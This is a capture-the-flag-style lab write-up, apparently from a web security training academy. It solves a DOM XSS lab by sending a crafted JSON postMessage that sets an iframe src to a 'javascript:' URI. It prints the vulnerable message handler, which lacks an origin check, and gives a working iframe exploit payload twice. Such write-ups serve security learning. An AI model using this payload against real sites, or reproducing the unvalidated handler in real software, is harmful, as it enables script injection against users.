## DOM XSS using web messages and JSON.parse

This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

## Notes

- Exploit Server
- ads feature
- EventListener for message in home page

## Resume

1. Inspect the `postMessage()` handler
2. Identify the insecure `JSON.parse()`
3. Find the vulnerable `load-channel` case
4. Control the iframe `src`
5. Inject a `javascript:` URI
6. Trigger XSS

## Solve

The application listens for web messages using `window.addEventListener('message')`:

```html
<script>
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'),
        ACMEplayer = {element: iframe},
        d;

    document.body.appendChild(iframe);

    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }

    switch(d.type) {

        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;

        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;

        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }

}, false);
</script>
```

The application accepts messages from **any origin** because there is no validation on:

```javascript
e.origin
```

The received message is parsed with:

```javascript
d = JSON.parse(e.data);
```

The vulnerable functionality is located inside the switch statement:

```javascript
case "load-channel":
    ACMEplayer.element.src = d.url;
    break;
```

The `url` property is directly assigned to the iframe `src` attribute without validation.

Because iframe `src` accepts `javascript:` URIs, we can execute arbitrary JavaScript.

```html
<iframe
    src="https://0a26009c0380b8d280ffbc7200200095.web-security-academy.net/"
    onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

When the iframe loads:

```javascript
this.contentWindow.postMessage(...)
```

sends the following JSON message to the vulnerable page:

```json
{
  "type":"load-channel",
  "url":"javascript:print()"
}
```

The target page receives the message and executes:

```javascript
d = JSON.parse(e.data);
```

Result:

```javascript
d.type === "load-channel"
```

which triggers:

```javascript
ACMEplayer.element.src = d.url;
```

So the application effectively executes:

```javascript
iframe.src = "javascript:print()"
```

The browser interprets this as JavaScript and executes:

```javascript
print()
```

resulting in XSS.

```html
<iframe
    src="https://0a26009c0380b8d280ffbc7200200095.web-security-academy.net/"
    onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```